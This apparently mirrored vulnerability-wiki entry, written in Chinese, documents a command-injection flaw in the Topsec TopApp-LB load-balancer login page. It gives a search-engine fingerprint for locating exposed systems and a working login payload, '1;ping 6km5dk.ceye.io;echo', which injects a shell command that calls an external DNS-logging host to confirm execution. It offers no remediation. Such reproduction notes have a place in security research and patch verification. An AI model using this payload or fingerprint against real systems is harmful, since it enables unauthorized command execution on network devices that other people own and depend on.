---
title: "天融信 TopApp-LB 命令执行漏洞"
date: 2026-10-16 09:10:33
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "天融信"
tags:
  - "天融信"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

天融信负载均衡TopApp-LB系统存在任意命令执行

## 漏洞影响

```
天融信负载均衡TopApp-LB
```

## 网络测绘

```
app="天融信-TopApp-LB-负载均衡系统"
```

## 漏洞复现

登录界面中存在命令执行



账号:**1;ping 6km5dk.ceye.io;echo**

密码:**任意**



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202091921374.png)



成功收到请求



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202091921379.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E5%A4%A9%E8%9E%8D%E4%BF%A1-TopApp-LB-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
